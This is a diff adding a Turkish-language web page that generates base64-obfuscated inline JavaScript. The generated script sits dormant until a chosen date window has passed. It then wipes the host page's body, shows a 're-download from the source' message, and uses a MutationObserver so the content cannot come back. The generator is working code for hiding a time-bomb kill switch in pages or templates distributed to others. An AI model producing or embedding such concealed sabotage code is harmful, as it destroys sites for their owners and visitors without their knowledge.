@@ -1,0 +1,172 @@
+<!doctype html>
+<html lang="tr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <meta name="robots" content="noindex">
+  <title>Inline JS Generator</title>
+</head>
+
+<body class="min-h-screen bg-slate-950 text-slate-100">
+  <div class="max-w-3xl mx-auto p-6">
+    <div class="rounded-2xl border border-slate-800 bg-slate-900/40 p-6 shadow">
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <div>
+          <label class="text-sm text-slate-300">Baslangic (auto: bugün)</label>
+          <input id="start" type="date" 
+                 class="mt-2 w-full rounded-xl bg-slate-950/60 border border-slate-800 px-3 py-2 opacity-70" />
+        </div>
+
+        <div>
+          <label class="text-sm text-slate-300">Bitis (auto: +30 gun, degistirilebilir)</label>
+          <input id="end" type="date"
+                 class="mt-2 w-full rounded-xl bg-slate-950/60 border border-slate-800 px-3 py-2 outline-none focus:ring-2 focus:ring-slate-600" />
+        </div>
+      </div>
+
+      <div class="mt-4">
+        <label class="text-sm text-slate-300">Mesaj (ASCII only)</label>
+        <input id="msg" type="text"
+               class="mt-2 w-full rounded-xl bg-slate-950/60 border border-slate-800 px-3 py-2 outline-none focus:ring-2 focus:ring-slate-600"
+               value="Lutfen indirdiginiz kaynagi ziyaret edip tekrar indiriniz" />
+
+        <div class="mt-2 flex items-center gap-3 text-xs text-slate-400">
+          <label class="flex items-center gap-2">
+            <input id="asciiOnly" type="checkbox" checked class="accent-slate-300" />
+            Turkce/ozel karakterleri temizle
+          </label>
+          <span id="asciiInfo" class="truncate"></span>
+        </div>
+      </div>
+
+      <div class="mt-6 flex flex-wrap items-center gap-3">
+        <button id="gen" class="rounded-xl bg-slate-200 text-slate-950 px-4 py-2 font-medium hover:bg-white active:scale-[0.99]">
+          Generate
+        </button>
+        <button id="copy" class="rounded-xl border border-slate-700 px-4 py-2 text-slate-200 hover:bg-slate-800 active:scale-[0.99]">
+          Copy
+        </button>
+        <span id="status" class="text-xs text-slate-400"></span>
+      </div>
+
+      <div class="mt-6">
+        <label class="text-sm text-slate-300">Uretilen Kod</label>
+        <textarea id="out" rows="11"
+                  class="mt-2 w-full rounded-xl bg-slate-950/60 border border-slate-800 px-3 py-2 font-mono text-xs outline-none focus:ring-2 focus:ring-slate-600"></textarea>
+      </div>
+    </div>
+  </div>
+
+  <script>
+  (function(){
+    var startEl = document.getElementById('start')
+    var endEl = document.getElementById('end')
+    var msgEl = document.getElementById('msg')
+    var outEl = document.getElementById('out')
+    var genEl = document.getElementById('gen')
+    var copyEl = document.getElementById('copy')
+    var statusEl = document.getElementById('status')
+    var asciiOnlyEl = document.getElementById('asciiOnly')
+    var asciiInfoEl = document.getElementById('asciiInfo')
+
+    function pad2(n){ return (n < 10 ? '0' : '') + n }
+    function toISODate(d){ return d.getFullYear() + '-' + pad2(d.getMonth()+1) + '-' + pad2(d.getDate()) }
+
+    function addDays(d, days){
+      var x = new Date(d.getTime())
+      x.setDate(x.getDate() + days)
+      return x
+    }
+
+    function asciiClean(s){
+      var map = { 'ç':'c','Ç':'C','ğ':'g','Ğ':'G','ı':'i','İ':'I','ö':'o','Ö':'O','ş':'s','Ş':'S','ü':'u','Ü':'U' }
+      var r = ''
+      for (var i=0;i<s.length;i++){
+        var ch = s[i]
+        r += (map[ch] || ch)
+      }
+      return r.replace(/[^\x20-\x7E]/g, '')
+    }
+
+    function utf8ToB64(str){
+      return btoa(unescape(encodeURIComponent(str)))
+    }
+
+    function escapeForTemplateLiteral(s){
+      return s
+        .replace(/\\/g, '\\\\')
+        .replace(/`/g, '\\`')
+        .replace(/\$\{/g, '\\${')
+    }
+
+    function payloadJS(startY, startM, startD, endY, endM, endD, msg){
+      var safeMsg = escapeForTemplateLiteral(msg)
+      return "(function(){var now=new Date();var start=new Date(" +
+        startY + "," + startM + "," + startD + ",0,0,0,0" +
+        ");var end=new Date(" +
+        endY + "," + endM + "," + endD + ",23,59,59,999" +
+        ");if(now<start||now>end){var kill=function(){var html=document.documentElement;var oldBody=document.body;if(oldBody){html.removeChild(oldBody)}var newBody=document.createElement('body');newBody.innerHTML=`<div style=\"margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh;width:100%;font-family:Arial,sans-serif;font-size:20px;text-align:center;\">" +
+        safeMsg +
+        "</div>`;html.appendChild(newBody);new MutationObserver(function(){if(document.body!==newBody){html.removeChild(document.body);html.appendChild(newBody)}}).observe(html,{childList:true})};if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',kill)}else{kill()}}})();"
+    }
+
+    function buildOutput(){
+      statusEl.textContent = ''
+
+      var start = new Date(startEl.value + "T00:00:00")
+      var end = new Date(endEl.value + "T00:00:00")
+
+      var msg = msgEl.value || ''
+      if (asciiOnlyEl.checked) msg = asciiClean(msg)
+
+      asciiInfoEl.textContent = asciiOnlyEl.checked ? ("ASCII: " + msg) : ""
+
+      var p = payloadJS(
+        start.getFullYear(), start.getMonth(), start.getDate(),
+        end.getFullYear(), end.getMonth(), end.getDate(),
+        msg
+      )
+
+      var blob = utf8ToB64(p)
+
+      var finalCode =
+        "<script>(function(){var p='" + blob +
+        "';Function(decodeURIComponent(escape(atob(p))))();})();</" + "script>"
+
+      outEl.value = finalCode
+      statusEl.textContent = 'Uretildi'
+    }
+
+    function copyOut(){
+      var v = outEl.value || ''
+      if (!v) return
+      navigator.clipboard.writeText(v).then(function(){
+        statusEl.textContent = 'Kopyalandi'
+      }).catch(function(){
+        statusEl.textContent = 'Kopyalanamadi'
+      })
+    }
+
+    var now = new Date()
+    var start = new Date(now.getFullYear(), now.getMonth(), now.getDate())
+    var end = addDays(start, 30)
+
+    startEl.value = toISODate(start)
+    endEl.value = toISODate(end)
+    asciiInfoEl.textContent = "ASCII: " + asciiClean(msgEl.value)
+
+    genEl.addEventListener('click', buildOutput)
+    copyEl.addEventListener('click', copyOut)
+    msgEl.addEventListener('input', function(){
+      asciiInfoEl.textContent = asciiOnlyEl.checked ? ("ASCII: " + asciiClean(msgEl.value)) : ""
+    })
+    asciiOnlyEl.addEventListener('change', function(){
+      asciiInfoEl.textContent = asciiOnlyEl.checked ? ("ASCII: " + asciiClean(msgEl.value)) : ""
+    })
+
+    buildOutput()
+  })()
+  </script>
+</body>
+</html>
